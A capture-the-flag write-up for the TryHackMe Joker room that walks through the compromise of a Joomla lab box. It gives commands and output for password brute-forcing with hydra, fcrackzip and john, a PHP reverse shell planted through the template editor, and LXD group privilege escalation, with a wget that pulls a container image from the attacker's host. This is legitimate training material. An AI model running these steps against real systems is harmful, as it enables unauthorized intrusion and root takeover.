# TryHackMe — HA: Joker CTF | Full Writeup

**Room:** <https://tryhackme.com/room/jokerctf>  
**Difficulty:** Medium  
**OS:** Linux

Joker is a Joomla-based box where nothing is reachable through the obvious entry point. The main site on port 80 is static, and a second service on port 8080 demands HTTP Basic Auth before showing anything at all. The way in is content discovery: a couple of exposed files on port 80 leak a username and a hint about the authenticated service, brute-forcing gets a password, and from there a Joomla CMS opens up. A password-protected backup archive hands over a crackable admin hash, and Joomla's own template editor becomes the code-execution primitive. Root comes from a classic Linux group misconfiguration: `www-data` sitting in the `lxd` group, which is functionally equivalent to root on the host.

---

## 1. Reconnaissance

```
nmap -sV -p- -T4 $IP
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.41
|_http-title: 401 Unauthorized
| http-auth:
|_  Basic realm=Please enter the password.
```

Port 80 serves a static page with no obvious interaction points. Port 8080 rejects every request with a Basic Auth prompt, nothing to look at there until credentials exist.

---

## 2. Content Discovery on Port 80

Since the front page gives nothing away, the next step is brute-forcing for hidden files rather than directories, appending common extensions:

```
dirb http://$IP/ -w /usr/share/wordlists/dirb/big.txt -X .txt,.php
```

Two files turn up that aren't linked from anywhere on the page:

```
/secret.txt
/phpinfo.php
```

`secret.txt` holds what reads like a fragment of an internal conversation between two people, and one of the names mentioned lines up with a valid system account: **joker**. `phpinfo.php` exposes the standard PHP environment dump, useful for confirming server details but not a foothold on its own. The real value of this step is the username; it's what makes the port 8080 wall worth attacking.

---

## 3. Brute-Forcing Basic Auth on Port 8080

With a username in hand, the 401-protected service becomes a straightforward brute-force target:

```
hydra -l joker -P /usr/share/wordlists/rockyou.txt $IP http-get -s 8080
```

```
[8080][http-get] host: $IP   login: joker   password: hannah
```

**Credentials:** `joker:hannah`

---

## 4. Authenticated Enumeration — Joomla

Logging into port 8080 with those credentials reveals a **Joomla-based CMS**. With valid credentials now available, directory brute-forcing can run authenticated instead of blind:

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt \
  -u http://$IP:8080/ -U joker -P hannah
```

```
/administrator   (Joomla admin panel)
/backup          (unusual, worth checking first)
```

`/administrator` is expected for any Joomla install. `/backup` isn't, and an exposed backup on a CMS is almost always worth more than the login panel itself.

---

## 5. Backup File Discovery

```
http://$IP:8080/backup/backup.zip
```

The archive is password-protected. Since the only password confirmed to work anywhere on this box so far is `hannah`, that gets tried first, either directly or via a quick zip-crack:

```
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
```

```
PASSWORD FOUND!!!!: pw == hannah
```

Password reuse strikes again. Extracting the archive:

```
unzip backup.zip
```

Inside: a full Joomla site export, including `db/joomladb.sql`, a database dump.

---

## 6. Database Analysis — Cracking the Admin Hash

```
cat db/joomladb.sql | grep -A2 cc1gr_users
```

```
INSERT INTO `cc1gr_users` VALUES
(547,'Super Duper User','admin','admin@example.com',
'$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG', ...);
```

A bcrypt hash for the Joomla `admin` account, sitting in a plaintext SQL dump inside a backup that was only protected by a password already reused elsewhere on the box. Bcrypt is deliberately slow to crack, but a weak underlying password still falls to a wordlist:

```
echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
abcd1234 (?)
```

**Joomla admin credentials:** `admin:abcd1234`

---

## 7. Remote Code Execution via Joomla Template Editor

Logging into `/administrator` with those credentials gives full CMS control. Joomla lets an authenticated admin edit theme PHP files directly from the dashboard:

```
Extensions → Templates → Templates → (active template) → index.php
```

Saved changes write straight to the live filesystem, no separate file-upload vulnerability required. Admin access to the template editor already *is* code execution. A standard PHP reverse shell (the pentestmonkey payload) was pasted into `index.php` and saved.

Listener on the attacker box:

```
nc -nvlp 1234
```

Triggering the payload through the template's **Preview** button fires the request server-side:

```
Connection received on $IP
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

The shell lands as `www-data`, and the `groups` output already shows the privilege escalation path before any further enumeration is needed.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 8. Privilege Escalation — LXD Group Membership

Being a member of the `lxd` group is equivalent to root on the host: LXD can create containers with `security.privileged=true`, and a privileged container's root user maps directly to the host's root, with the host filesystem mountable inside it.

### Build a minimal image (attacker machine)

```
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

This produces `alpine-*.tar.gz`, a minimal Alpine Linux container image.

### Transfer it to the target

```
python3 -m http.server 8888
```

```
# on the target
cd /tmp
wget http://$LHOST:8888/alpine-*.tar.gz
```

### Import and launch a privileged container

```
lxc image import alpine-*.tar.gz --alias myalpine
lxc init myalpine ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

The `disk` device mounts the entire host root filesystem into the container at `/mnt/root`. Since the container is privileged, its root user has full read/write access to that mount, which is the host's real filesystem.

```
id
uid=0(root) gid=0(root)

cd /mnt/root/root
cat final.txt
```

Root, by way of a container escape that never needed to exploit LXD itself. The group membership alone was the vulnerability.

---

## Attack Chain

```
nmap ($IP → 22, 80, 8080 basic-auth-protected)
  └─→ dirb (port 80, extension brute-force) → secret.txt, phpinfo.php
        └─→ secret.txt → username "joker"
              └─→ hydra (port 8080, Basic Auth) → joker:hannah
                    └─→ Joomla CMS → gobuster (authenticated) → /backup
                          └─→ backup.zip (password: hannah, reused)
                                └─→ joomladb.sql → admin bcrypt hash
                                      └─→ john (rockyou) → abcd1234
                                            └─→ Joomla admin panel
                                                  └─→ Template Editor → PHP reverse shell
                                                        └─→ shell as www-data (already in group "lxd")
                                                              └─→ build + import privileged Alpine container
                                                                    └─→ mount host / → root
```

---

## Key Concepts

| Concept | Explanation |
|---|---|
| **Extension-aware content discovery** | A directory brute-force with default settings misses files like `secret.txt` or `phpinfo.php` unless the wordlist run explicitly appends extensions (`-X .txt,.php` in dirb). Static-looking sites often still expose files that were never meant to be linked. |
| **Password reuse across services** | The same password (`hannah`) shows up for the `joker` web account and for the encrypted backup archive. Once one password is confirmed real, it's worth trying everywhere else on the box before brute-forcing from scratch again. |
| **Backups as a bigger attack surface than the app itself** | An exported `.zip` of a CMS often contains the full source, configuration files, and a database dump, far more than what the live application exposes, and frequently protected by a weaker password than the actual admin panel. |
| **Bcrypt is slow, not unbreakable** | Bcrypt's cost factor makes brute-forcing expensive per guess, but it doesn't protect a genuinely weak password like `abcd1234` against a wordlist attack; slow hashing raises the bar, it doesn't remove it. |
| **CMS template editors as a code-execution primitive** | Any CMS that lets an authenticated admin edit server-side template files directly is effectively offering code execution as a built-in feature. No separate upload vulnerability is needed once that level of access exists. |
| **LXD group membership as a root-equivalent misconfiguration** | The LXD daemon typically runs as root, and members of the `lxd` group can launch privileged containers without needing `sudo`. Mounting the host filesystem into a privileged container's root context is a direct, tool-assisted path from group membership to full root. |

---

## Flags

| Item | Path | Value |
|---|---|---|
| Root proof file | `/root/final.txt` | ASCII-art congratulations banner (not a flag hash); capture the file/screenshot as your proof |
